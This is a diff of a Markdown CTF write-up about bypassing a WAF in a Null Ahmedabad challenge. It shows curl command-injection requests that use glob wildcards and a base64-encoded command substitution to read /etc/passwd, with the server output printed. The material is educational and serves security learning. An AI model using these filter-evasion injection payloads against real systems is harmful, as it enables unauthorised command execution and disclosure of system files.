@@ -1,14 +1,14 @@
-### Null Ahmedabad WAF Writeup
+## Null Ahmedabad WAF Writeup
 Hello there!
 <br>
 <br>
-It is always a great experience with NullAhm.There was a wonderful CTF challenge made by @_x30r as a part of Null Monthly Meetup(26/4/2020).This is a documentation of my experience and my learning through this.So lets get right into this.
-<br>
+It is always a great experience with NullAhm.There was a wonderful CTF challenge made by @_x30r as a part of Null Monthly Meetup(26/4/2020).This is a documentation of my experience and my learning through this.Many people had solved this challenge using wonderful ways and way before I had solved it.Those answers were amazing please look at them in @NullAhm twitter.So let's get right into this.
+
 <br>
 
 The Other day, I searched for WAF evasion techniques. Just to get a rough idea what it is like dealing with WAF.I came across some wonderfull stuff by @Menin_TheMiddle. Worth a read.
 <br>
-<a href="https://medium.com/@themiddleblue">https://medium.com/@themiddleblue</a>
+<a href="https://medium.com/@themiddleblue" target="_blank">https://medium.com/@themiddleblue</a>
 
 Now moving on to the original CTF.Here's what it looks like.
 <br>
@@ -22,8 +22,8 @@ The line at the end says:
 <br>
 `Your aim is to get the contents of /etc/passwd using “cat” command only. Check /rce.php?cmd= and /rce1.php?cmd= but code for 1st challenge is available and can be easily solved!`
 <br>
-## rce1.php
-Now lets try to do what it says with curl.
+## rce.php
+Now let's try to do what it says with curl.
 <br>
 #### Request:
 ```bash
@@ -35,10 +35,11 @@ Print /etc/passwd contents via cat command only!
 ```
 I tried to append "cat /etc/passwd" in the url.Didn't work. 
 I tried to download that file using wget but it only contained the above response in written in that file :(
+<br>
 
-Lets try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had ~~read~~ skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).
+Let's try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had ~~read~~ skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).
 
-<a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a>
+<a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a>
 
 #### Wildcard Table
 
@@ -55,7 +56,7 @@ Lets try other things that were pointed by the hint given in Twitter Page of @Nu
 
 <br>
 <br>
-Lets try wilcards.Some WAF may not filter such wildcards.
+Let's try wilcards.Some WAF may not filter such wildcards.
 So, my payload was /bi?/ca?+/et?/passw? 
 <br>
 #### Request:
@@ -76,7 +77,8 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 ```
 Success! Now rce1.php won't be as easy as this.
 
-<br>
+## rce1.php
+
 #### Request:
 ```bash
 $ curl http://35.215.137.8/rce1.php?cmd=/bi?/ca?+/et?/passw?
@@ -88,9 +90,9 @@ Now print /etc/passwd contents via cat command only!
 <br>/biopps?/caoops ?+/etoops ?/passwopps?</br>
 
 ```
-After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn't restricting normal alphabetic characters.So the first though came into my mind was base64 encoding.Hence, I entered following command in my terminal.
 
-<br>
+After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn't restricting normal alphabetic characters.So the first thought came into my mind was base64 encoding.Hence, I entered following command in my terminal.
+
 #### Terminal:
 ```bash
 $echo "cat /etc/passwd" | base64 -      # '-' takes input file as output of previous echo. Same as $1.
@@ -100,7 +102,7 @@ cat /etc/passwd                         #yay! It outputs our payload command.
 $ $(echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d )  #Instead of printing this will execute the above output.
 ```
 <br>
-Lets inject this in the rce1.php.
+Let's inject this in the rce1.php.
 <br>
 #### Request:
 ```bash
@@ -118,9 +120,18 @@ games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 ...
 ```
-Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.
-$(echo Y2F0IC9ldGMvcGFzc3dkCg== oops | base64 -d -). Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string "oops".Ctrl + x.Go to sleep.
+Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.I searched about how base64 encoding worked and found an interesting property.  
 <br>
-Thank You for reading my first blog. 
+<br>
+
+```
+$(echo+Y2F0IC9ldGMvcGFzc3dkCg==+oops+|+base64+-d+-)
+```
+ Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string "oops" because of the '+' which was parsed as a space in between. base64 encoded data is a string of character that contains only a-z, A-Z, 0-9, + and / characters.No spaces.
+Ctrl + x.Shutdown.Go to sleep.
+<br>
+```
+Thank You! ;)
+``` 
 
 
